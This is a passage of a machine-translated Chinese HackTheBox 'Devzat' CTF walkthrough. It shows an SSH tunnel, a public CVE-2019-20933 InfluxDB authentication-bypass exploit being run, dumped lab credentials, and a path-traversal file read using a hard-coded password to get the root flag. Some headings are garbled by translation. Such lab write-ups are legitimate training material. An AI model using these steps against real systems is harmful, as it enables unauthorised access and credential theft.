bi translated">像往常一样，让我们先看看一些显而易见的东西，如果没有什么突出的东西，那么我们可以让LinPEAS过来帮忙。当我看到开放的港口时，我注意到一些有趣的事情:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d971" class="nc km iq my b gy nd ne l nf ng">patrick@devzat:~$ netstat -tunepl<br/>Active Internet connections (only servers)<br/>Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    <br/>tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1000       36107      838/./petshop       <br/>tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        32508      -                   <br/>tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN      0          36829      -                   <br/>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          34658      -                   <br/>tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      0          36030      -                   <br/>tcp6       0      0 :::80                   :::*                    LISTEN      0          36126      -                   <br/>tcp6       0      0 :::22                   :::*                    LISTEN      0          34660      -                   <br/>tcp6       0      0 :::8000                 :::*                    LISTEN      1000       36036      840/./devchat       <br/>udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        32424      -</span></pre><p id="8f8d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在本地主机/127.0.0.1上监听的端口在nmap扫描中没有显示出来。我们可以查找在该地址上运行的进程:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="ea59" class="nc km iq my b gy nd ne l nf ng">patrick@devzat:~$ ps -ef | grep 127.0.0.1<br/>root        1253     996  0 20:33 ?        00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8086 -container-ip 172.17.0.2 -container-port 8086</span></pre><h1 id="88bb" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">SSH隧道</h1><p id="670d" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">docker容器绝对值得进一步研究。要与之交互，我们需要从Kali到盒子的隧道端口。就像我们在HackTheBox机器上所做的一样<a class="ae nj" href="https://pencer.io/ctf/ctf-htb-explore" rel="noopener ugc nofollow" target="_blank"> Explore </a>让我们创建一个SSH连接，并将任何对端口8086的本地访问转发到devzat:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="5f8b" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# ssh -L 8086:localhost:8086 -i id_rsa patrick@devzat.htb                                                                                                                     <br/>Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)<br/>Last login: Sun Oct 31 21:25:50 2021 from 10.10.15.40<br/>patrick@devzat:~$</span></pre><p id="d58f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，当我们尝试本地访问端口8086时，它会传递到机器:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="ebef" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# curl http://localhost:8086 <br/>404 page not found</span></pre><h1 id="a38a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">NMAP扫描</h1><p id="cca0" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">对该端口的快速扫描显示，它正在托管一个InfluxDB:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="00d0" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# nmap -p 8086 -sV localhost<br/>Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-31 21:41 GMT<br/>Nmap scan report for localhost (127.0.0.1)<br/>Host is up (0.000024s latency).<br/>Other addresses for localhost (not scanned): ::1<br/><br/>PORT     STATE SERVICE VERSION<br/>8086/tcp open  http    InfluxDB http admin 1.7.5<br/><br/>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds</span></pre><h1 id="1b09" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">InfluxDB</h1><p id="b916" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">看看<a class="ae nj" href="https://docs.influxdata.com/influxdb/v1.8/about_the_project/releasenotes-changelog/#176-2019-04-16" rel="noopener ugc nofollow" target="_blank"> InfluxDB版本1.7.6 </a>的发行说明就知道了:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="e12c" class="nc km iq my b gy nd ne l nf ng">Fix security vulnerability when [http]shared-secret configuration setting is blank.</span></pre><p id="d2a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以1.7.5是易受攻击的，在谷歌上搜索漏洞首先会出现:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/bf32a9ccb3c02e46d2512d0d5f9d1f31.png" data-original-src="https://miro.medium.com/v2/resize:fit:1392/format:webp/0*bp74dlXtxBOwwPLS.png"/></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">搜索InfluxDB漏洞</figcaption></figure><p id="edce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们抓住漏洞，按照这里<a class="ae nj" href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933" rel="noopener ugc nofollow" target="_blank">的描述运行</a>:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="d8e6" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/devzat]<br/>└─# git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git<br/>Cloning into 'InfluxDB-Exploit-CVE-2019-20933'...<br/>remote: Enumerating objects: 20, done.<br/>remote: Counting objects: 100% (20/20), done.<br/>remote: Compressing objects: 100% (20/20), done.<br/>remote: Total 20 (delta 5), reused 4 (delta 0), pack-reused 0<br/>Receiving objects: 100% (20/20), 5.97 KiB | 2.98 MiB/s, done.<br/>Resolving deltas: 100% (5/5), done.<br/>Command 'pip' not found, but can be installed with:<br/>apt install python3-pip<br/>Do you want to install it? (N/y)y<br/>apt install python3-pip<br/>Reading package lists... Done<br/>Building dependency tree... Done<br/>Reading state information... Done<br/>&lt;SNIP&gt;<br/>Preparing to unpack .../python3-pip_20.3.4-4_all.deb ...<br/>Unpacking python3-pip (20.3.4-4) ...<br/>Setting up python3-wheel (0.34.2-1) ...<br/>Setting up python3-pip (20.3.4-4) ...<br/>Processing triggers for man-db (2.9.4-2) ...<br/>Processing triggers for kali-menu (2021.4.0) ...<br/>                         <br/>┌──(root💀kali)-[~/htb/devzat/InfluxDB-Exploit-CVE-2019-20933]<br/>└─# pip install -r requirements.txt<br/>Collecting pip~=21.0.1<br/>  Downloading pip-21.0.1-py3-none-any.whl (1.5 MB)<br/>     |████████████████████████████████| 1.5 MB 3.6 MB/s <br/>Requirement already satisfied: pytz~=2021.1 in /usr/lib/python3/dist-packages (from -r requirements.txt (line 2)) (2021.1)<br/>&lt;SNIP&gt;<br/>Successfully installed PyJWT-2.0.1 certifi-2020.12.5 idna-3.3 influxdb-5.3.1 numpy-1.20.3 pandas-1.2.5 pip-21.0.1 setuptools-56.0.0 six-1.15.0</span></pre><h1 id="0a1e" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">利用涌入b</h1><p id="c0a0" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">我必须先安装pip，因为这个Kali安装程序还没有它。之后，我安装了需求，所以现在我们可以运行利用:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mp mq di mr bf ms"><div class="gh gi nn"><img src="../Images/276a2f0b187d29e1a5f8a73873d0e7ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vuZmqE-saUP7isKlC9tZ5g.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">InfluxDB漏洞利用</figcaption></figure><p id="840c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">漏洞成功了，我们已经连接到数据库。接下来的这一点花了我很长时间，但最终我发现这很有效:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="dba8" class="nc km iq my b gy nd ne l nf ng">[devzat] Insert query (exit to change db): select * from "user"<br/>{<br/>    "results": [<br/>        {<br/>            "series": [<br/>                {<br/>                    "columns": [<br/>                        "time",<br/>                        "enabled",<br/>                        "password",<br/>                        "username"<br/>                    ],<br/>                    "name": "user",<br/>                    "values": [<br/>                        [<br/>                            "2021-06-22T20:04:16.313965493Z",<br/>                            false,<br/>                            "WillyWonka2021",<br/>                            "wilhelm"<br/>                        ],<br/>                        [<br/>                            "2021-06-22T20:04:16.320782034Z",<br/>                            true,<br/>                            "woBeeYareedahc7Oogeephies7Aiseci",<br/>                            "catherine"<br/>                        ],<br/>                        [<br/>                            "2021-06-22T20:04:16.996682002Z",<br/>                            true,<br/>                            "RoyalQueenBee$",<br/>                            "charles"<br/>                        ]<br/>                    ]<br/>                }<br/>            ],<br/>            "statement_id": 0<br/>        }<br/>    ]<br/>}</span></pre><h1 id="6c4c" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">将用户切换到Catherine</h1><p id="6857" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">我们有三个用户和密码。我们知道Catherine是机器上的第二个用户，她尝试通过SSH登录，但失败了，但是我们可以切换用户:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="9bb1" class="nc km iq my b gy nd ne l nf ng">patrick@devzat:~$ su catherine<br/>Password:</span></pre><p id="f39a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">列举凯瑟琳所有的东西显示了一些有趣的事情:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="9bfa" class="nc km iq my b gy nd ne l nf ng">catherine@devzat:~$ find / -group catherine -not -path "/proc/*" 2&gt; /dev/null<br/>/home/catherine<br/>/home/catherine/.profile<br/>/home/catherine/.cache<br/>/home/catherine/.cache/motd.legal-displayed<br/>/home/catherine/.bashrc<br/>/home/catherine/.ssh<br/>/home/catherine/.ssh/id_rsa.pub<br/>/home/catherine/.ssh/id_rsa<br/>/home/catherine/.ssh/known_hosts<br/>/home/catherine/.ssh/authorized_keys<br/>/home/catherine/user.txt<br/>/home/catherine/.gnupg<br/>/home/catherine/.gnupg/private-keys-v1.d<br/>/home/catherine/.bash_logout<br/>/var/backups/devzat-main.zip<br/>/var/backups/devzat-dev.zip</span></pre><h1 id="b545" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">发现的备份</h1><p id="a25e" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">主站点和开发站点的备份，值得一看为什么Catherine拥有它们:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="3af6" class="nc km iq my b gy nd ne l nf ng">catherine@devzat:~$ cp /var/backups/devzat-main.zip /dev/shm<br/>catherine@devzat:~$ cp /var/backups/devzat-dev.zip /dev/shm<br/>catherine@devzat:~$ cd /dev/shm/<br/>catherine@devzat:/dev/shm$ unzip devzat-dev.zip<br/>Archive:  devzat-dev.zip<br/>   creating: dev/<br/>  inflating: dev/go.mod<br/>&lt;SNIP&gt;<br/> extracting: dev/allusers.json<br/><br/>catherine@devzat:/dev/shm$ unzip devzat-main.zip<br/>Archive:  devzat-main.zip<br/>   creating: main/<br/>  inflating: main/go.mod<br/>&lt;SNIP&gt;<br/>  inflating: main/allusers.json</span></pre><h1 id="c589" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">不同文件</h1><p id="9087" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">我们可以使用diff来检查两个文件夹的更改:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="dfd4" class="nc km iq my b gy nd ne l nf ng">catherine@devzat:/dev/shm$ find dev -type f|sort|xargs ls -l| awk '{print $5,$8}' &gt; dev.txt<br/>catherine@devzat:/dev/shm$ find main -type f|sort|xargs ls -l| awk '{print $5,$8}' &gt; main.txt<br/>catherine@devzat:/dev/shm$ diff dev.txt main.txt <br/>1c1<br/>&lt; 3 06:37<br/>---<br/>&gt; 108 06:38<br/>5,6c5,6<br/>&lt; 13827 18:35<br/>&lt; 11341 06:56<br/>---<br/>&gt; 12403 18:35<br/>&gt; 11332 06:54<br/>16d15<br/>&lt; 356 18:35</span></pre><p id="9e19" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">三个文件略有不同，我们可以再次使用diff来查看每个文件:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="8314" class="nc km iq my b gy nd ne l nf ng">catherine@devzat:/dev/shm$ diff dev/devchat.go main/devchat.go <br/>27c27<br/>&lt;       port = 8443<br/>---<br/>&gt;       port = 8000<br/>114c114<br/>&lt;               fmt.Sprintf("127.0.0.1:%d", port),<br/>---<br/>&gt;               fmt.Sprintf(":%d", port),</span></pre><h1 id="f0bc" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">代码审查</h1><p id="933c" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">我们看到devchat.go文件的dev版本中有端口8443。我们之前从外部访问端口8000来访问聊天，因此这显示了我们在机器内部使用端口8443来访问dev版本。</p><p id="ddf4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">8443个文件的grep找到了这个:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="dd62" class="nc km iq my b gy nd ne l nf ng">catherine@devzat:/dev/shm$ grep -rn "8443"<br/>main/devchat.go:194:            u.writeln("patrick", "I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.")<br/>dev/devchat.go:27:      port = 8443<br/>dev/devchat.go:194:             u.writeln("patrick", "I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.")</span></pre><p id="8586" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这确认了我们将在机器上本地访问dev实例。commands.go的不同之处在于:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="badd" class="nc km iq my b gy nd ne l nf ng">catherine@devzat:/dev/shm$ diff dev/commands.go main/commands.go <br/>&lt;SNIP&gt;<br/>&lt;               file        = commandInfo{"file", "Paste a files content directly to chat [alpha]", fileCommand, 1, false, nil}<br/>&lt;SNIP&gt;<br/>&lt; func fileCommand(u *user, args []string) {<br/>&lt;       if len(args) &lt; 1 {<br/>&lt;               u.system("Please provide file to print and the password")<br/>&lt;               return<br/>&lt;       }<br/>&lt;       if len(args) &lt; 2 {<br/>&lt;               u.system("You need to provide the correct password to use this function")<br/>&lt;               return<br/>&lt;       }<br/>&lt;       path := args[0]<br/>&lt;       pass := args[1]<br/>&lt; <br/>&lt;       // Check my secure password<br/>&lt;       if pass != "CeilingCatStillAThingIn2021?" {<br/>&lt;               u.system("You did provide the wrong password")<br/>&lt;               return<br/>&lt;       }</span></pre><p id="98a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一个只存在于dev版本中的新命令允许我们读取一个文件并直接显示在聊天中。我们只需要一个在代码中方便提供的密码！</p><h1 id="deda" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">宋承宪饰演凯瑟琳</h1><p id="5a16" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">我们来连线:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="e7e6" class="nc km iq my b gy nd ne l nf ng">catherine@devzat:~$ ssh -p 8443 catherine@localhost<br/>patrick: Hey Catherine, glad you came.<br/>catherine: Hey bud, what are you up to?<br/>patrick: Remember the cool new feature we talked about other day?<br/>catherine: Sure<br/>patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.<br/>catherine: Kinda busy right now 👔<br/>patrick: That's perfectly fine 👍  You'll need a password which you can gather from the source. I left it in our default backups location.<br/>catherine: k<br/>patrick: I also put the main so you could diff main dev if you want.<br/>catherine: Fine. As soon as the boss let me off the leash I will check it out.<br/>patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet. See ya!<br/>devbot: patrick has left the chat<br/>Welcome to the chat. There are no more users<br/>devbot: catherine has joined the chat<br/>catherine:</span></pre><h1 id="3511" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">根标志</h1><p id="b7b1" class="pw-post-body-paragraph jn jo iq jp b jq mj js jt ju mk jw jx jy ml ka kb kc mm ke kf kg mn ki kj kk ij bi translated">现在我们可以轻松地抓住根标志:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="bc68" class="nc km iq my b gy nd ne l nf ng">catherine: /file ../root.txt CeilingCatStillAThingIn2021?<br/>[SYSTEM] 374fe32e1eb4e8585a85d0d89883b636</span></pre><p id="778e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">完成了。下次见。</p></div><div class="ab cl no np hu nq" role="separator"><span class="nr bw bk ns nt nu"/><span class="nr bw bk ns nt nu"/><span class="nr bw bk ns nt"/></div><div class="ij ik il im in"><p id="081e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="d7d5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—<a class="ae nj" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae nj" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="fcf6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nv">原载于2022年4月13日</em><a class="ae nj" href="https://pencer.io/ctf/ctf-htb-devzat" rel="noopener ugc nofollow" target="_blank"><em class="nv">https://pencer . io</em></a><em class="nv">。</em></p></div></div>    
</body>
</html>